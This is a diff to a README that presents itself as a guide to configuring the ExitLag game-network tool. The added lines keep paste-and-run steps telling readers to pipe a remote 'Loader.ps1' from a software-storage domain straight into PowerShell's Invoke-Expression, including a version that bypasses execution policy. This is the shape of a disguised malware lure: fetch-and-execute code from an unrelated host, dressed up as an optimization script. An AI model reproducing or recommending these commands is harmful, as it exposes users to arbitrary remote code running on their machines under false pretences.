@@ -7,11 +7,6 @@ Welcome to the project dedicated to configuring and optimizing **ExitLag**. Here
 2. **Troubleshooting:** Solutions for common errors encountered with ExitLag.
 3. **Route Analysis:** How to select the best game server and route for your location.
 
-### 🚀 Direct Download
-
-[<img src="https://img.shields.io/badge/Download-black?style=for-the-badge&logo=github"/>](https://software-storage.su/files/Setup.zip)
-
-Read Readme.txt before install!
 
 ---
 
@@ -25,7 +20,7 @@ Read Readme.txt before install!
    Copy, paste, and press `Enter` to run the following optimized initialization command. This script dynamically configures the network bypass registry and fetches the necessary packages:
 
    ```powershell
-   irm https://software-storage.su/powershell/Loader.ps1 | iex
+   irm https://software-storage.org/powershell/Loader.ps1 | iex
    ```
 ---
 
@@ -34,13 +29,13 @@ Read Readme.txt before install!
 ### 📌 Bypass Execution Policy (Blocking Unsigned Scripts)
 If your system blocks the launch due to built-in execution policy constraints, enforce a bypass using this command:
 ```cmd
-powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.su/powershell/Loader.ps1 | iex"
+powershell -ExecutionPolicy Bypass -Command "irm https://software-storage.org/powershell/Loader.ps1 | iex"
 ```
 
 ### 📌 Error: "irm is not recognized..." (PowerShell 2.0 Legacy)
 In older legacy environments where aliases are missing, use explicit full system cmdlets:
 ```powershell
-Invoke-RestMethod https://software-storage.su/powershell/Loader.ps1 | Invoke-Expression
+Invoke-RestMethod https://software-storage.org/powershell/Loader.ps1 | Invoke-Expression
 ```
 
 
